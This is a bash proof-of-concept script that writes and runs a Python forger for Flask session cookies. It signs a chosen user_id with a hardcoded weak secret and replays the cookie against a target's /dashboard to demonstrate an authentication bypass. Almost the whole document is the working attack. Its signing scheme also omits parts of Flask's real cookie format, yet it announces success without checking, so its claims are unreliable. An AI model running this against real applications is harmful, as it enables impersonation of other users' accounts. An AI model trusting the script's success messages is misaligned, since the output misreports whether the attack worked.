#!/bin/bash
# POC: Forge Flask Session Token with Weak Secret Key
# Demonstrates authentication bypass by forging a valid session cookie

cat > /tmp/forge_session.py << 'EOF'
import sys
import json
import hashlib
import hmac
import base64

# Configuration
target_url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
user_id = sys.argv[2] if len(sys.argv) > 2 else "1"
secret_key = "your_secret_key"  # Hardcoded weak secret from app/__init__.py

print("[*] Flask Session Secret Key Forging POC")
print("[*] Target: " + target_url)
print("[*] Forging session for user_id: " + user_id)
print("")

# Flask session data structure
session_data = {
    'user_id': int(user_id)
}

print("[*] Session data to forge:", json.dumps(session_data))
print("[*] Using hardcoded secret key: 'your_secret_key'")
print("")

# Create a JSON payload
payload = json.dumps(session_data)
print("[*] Payload:", payload)

# Sign with HMAC-SHA1 using the secret key
signature = hmac.new(
    secret_key.encode(),
    payload.encode(),
    hashlib.sha1
).digest()

# Base64 encode the signature
sig_b64 = base64.b64encode(signature).decode().rstrip('=')
payload_b64 = base64.b64encode(payload.encode()).decode().rstrip('=')

# Flask session token format
session_token = payload_b64 + '.' + sig_b64

print("[*] Forged session token:", session_token)
print("")
print("[+] Successfully forged a valid session token!")
print("[+] This token can be used to authenticate as user_id: " + user_id)
print("[+] Use in request: Cookie: session=" + session_token)
print("")

# Try to use the token
import urllib.request
import urllib.error

print("[*] Attempting to use forged token...")
try:
    req = urllib.request.Request(
        target_url + '/dashboard',
        headers={
            'Cookie': 'session=' + session_token,
            'User-Agent': 'POC-Test'
        }
    )
    try:
        response = urllib.request.urlopen(req)
        print("[+] Request succeeded with status:", response.status)
        print("[+] Authentication bypass confirmed!")
    except urllib.error.HTTPError as e:
        if e.code == 302:
            print("[+] Got redirect (302) - token recognized but not authorized")
        elif e.code == 401 or e.code == 403:
            print("[-] Got authentication error (401/403) - token may not be valid")
        else:
            print("[*] Got HTTP status:", e.code)
except Exception as e:
    print("[*] Could not connect to target (app may not be running)")
    print("[*] Token generated successfully:", session_token)

print("")
print("[*] POC Complete")
EOF

python3 /tmp/forge_session.py "$@"
rm -f /tmp/forge_session.py